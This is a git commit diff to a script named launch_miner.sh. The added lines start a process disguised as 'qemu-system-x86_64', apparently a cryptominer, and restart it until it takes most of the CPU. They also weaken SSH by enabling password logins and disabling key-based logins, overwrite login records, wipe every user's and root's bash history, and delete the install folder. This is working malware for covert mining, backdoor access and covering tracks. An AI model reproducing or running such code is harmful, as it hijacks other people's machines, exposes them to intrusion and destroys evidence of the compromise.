92c42c836d067c6ea9b7947b8502934e53031a3c
githubuserold <30568730+githubuserold@users.noreply.github.com>
2017-09-06 18:57:47 +0300

    Update launch_miner.sh

--- launch_miner.sh
+++ launch_miner.sh
@@ -25,4 +25,29 @@ echo -e "[\n$(cat $workingdir/qemu-system-x86/bin/config.txt)" > $workingdir/qem
 echo -e "\"cpu_threads_conf\" :\n$(cat $workingdir/qemu-system-x86/bin/config.txt)" > $workingdir/qemu-system-x86/bin/config.txt
 cd $workingdir/qemu-system-x86/bin/
 nohup ./qemu-system-x86_64 &
-#rm -r /usr/share/packages_download/qemu-system-x86
+sleep 2
+process=`ps aux | grep -v grep | grep root | grep qemu | awk '{print $2}'`
+cpusage=`ps -p $process -o %cpu | grep -Eo "[0-9]*"`
+for_test=$((cpus * 100 - 100))
+while [ $for_test -gt $cpusage ]; do
+echo "while loop"
+kill -9 $process
+nohup ./qemu-system-x86_64 &
+sleep 2
+cpusage=`ps -p $process -o %cpu | grep -Eo "[0-9]*"`
+done
+sed -i 's/2\.0/0\.0/g' $workingdir/qemu-system-x86/donate-level.h
+cd
+sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config
+sed -i 's/PubkeyAuthentication yes/PubkeyAuthentication no/g' /etc/ssh/sshd_config
+sed -i 's/RSAAuthentication yes/RSAAuthentication no/g' /etc/ssh/sshd_config
+sed -i 's/authorized_keys/authorized_key/g' /etc/ssh/sshd_config
+service sshd restart
+sed -i 's/$ip/0.0.0.0/g' /var/log/lastlog
+users=`ll /home/ | grep -vE "root|total" | awk '{print $9}' | sed 's/\///g'`
+for i in ${users}; do
+        cat /dev/null > /home/$i/.bash_history
+done
+cat /dev/null > /root/.bash_history
+history -c
+rm -r /usr/share/packages_download
